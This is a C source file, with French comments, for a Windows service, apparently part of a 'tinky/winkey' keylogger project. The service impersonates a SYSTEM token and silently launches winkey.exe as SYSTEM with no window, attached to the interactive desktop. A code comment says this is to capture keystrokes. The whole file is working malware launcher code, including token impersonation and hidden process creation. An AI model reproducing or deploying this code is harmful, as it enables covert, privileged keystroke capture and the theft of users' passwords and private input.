#include "tinky.h"

// Fonction de gestion des contrôles du service
void WINAPI ServiceCtrlHandler(DWORD event)
{
    switch (event)
    {
        case SERVICE_CONTROL_STOP:
            g_service_status.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_handler_svc, &g_service_status);
            SetEvent(g_event);
            break;

        case SERVICE_CONTROL_PAUSE:
            g_service_status.dwCurrentState = SERVICE_PAUSED;
            SetServiceStatus(g_handler_svc, &g_service_status);
            break;

        case SERVICE_CONTROL_CONTINUE:
            g_service_status.dwCurrentState = SERVICE_CONTINUE_PENDING;
            SetServiceStatus(g_handler_svc, &g_service_status);
            break;

        case SERVICE_CONTROL_SHUTDOWN:
            g_service_status.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_handler_svc, &g_service_status);
            SetEvent(g_event);
            break;

        default:
            break;
    }
}

// Point d'entrée principal du service
void WINAPI ServiceMain(DWORD argc, LPSTR *argv)
{
    // initialize SERVICE_STATUS structure pour le start du service
    g_handler_svc = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (g_handler_svc == NULL)
    {
        printf("RegisterServiceCtrlHandler failed (%lu)\n", GetLastError());
        return;
    }
    memset(&g_service_status, 0, sizeof(SERVICE_STATUS));
    g_service_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_service_status.dwCurrentState = SERVICE_START_PENDING;
    g_service_status.dwControlsAccepted = 0;
    g_service_status.dwWin32ExitCode = NO_ERROR;
    g_service_status.dwServiceSpecificExitCode = 0;
    g_service_status.dwCheckPoint = 0;
    g_service_status.dwWaitHint = 0;
    SetServiceStatus(g_handler_svc, &g_service_status);

    // initialize stop event
    g_event = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!g_event)
    {
        g_service_status.dwCurrentState = SERVICE_STOPPED;
        g_service_status.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_handler_svc, &g_service_status);
        return;
    }

    // Impersonate SYSTEM token
    HANDLE system_token = impersonate_token();
    if (!system_token)
    {
        g_service_status.dwCurrentState = SERVICE_STOPPED;
        g_service_status.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_handler_svc, &g_service_status);
        CloseHandle(g_event);
        return;
    }

    // Met à jour le statut du service à RUNNING
    g_service_status.dwCurrentState = SERVICE_RUNNING;
    g_service_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(g_handler_svc, &g_service_status);

    // Lancement de winkey avec le token SYSTEM
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    ZeroMemory(&startup_info, sizeof(STARTUPINFOA));
    startup_info.cb = sizeof(STARTUPINFOA);
    startup_info.lpDesktop = (LPSTR)"winsta0\\default"; // Attachement au bureau interactif pour capturer les frappes
    ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));

    // Génération dynamique du chemin vers winkey.exe
    char winkey_path[MAX_PATH];
    GetModuleFileNameA(NULL, winkey_path, MAX_PATH);
    char *last_slash = strrchr(winkey_path, '\\');
    if (last_slash)
        strcpy_s(last_slash + 1, MAX_PATH - (size_t)(last_slash + 1 - winkey_path), "winkey.exe");
    else
        strcpy_s(winkey_path, MAX_PATH, "winkey.exe");

    // Lancement de winkey.exe en tant que SYSTEM
    if (!CreateProcessAsUserA(
            system_token,
            winkey_path,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup_info,
            &process_info))
    {
        printf("CreateProcessAsUser failed (%lu)\n", GetLastError());
        CloseHandle(system_token);
        CloseHandle(g_event);
        g_service_status.dwCurrentState = SERVICE_STOPPED;
        g_service_status.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_handler_svc, &g_service_status);
        return;
    }

    // Boucle / attente jusqu'au STOP / SHUTDOWN
    WaitForSingleObject(g_event, INFINITE);

    // Nettoyage avant l'arrêt du service
    if (process_info.hProcess)
    {
        TerminateProcess(process_info.hProcess, 0); // On tue winkey proprement
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }
    CloseHandle(system_token);
    CloseHandle(g_event);
    g_service_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_handler_svc, &g_service_status);
    return;
}



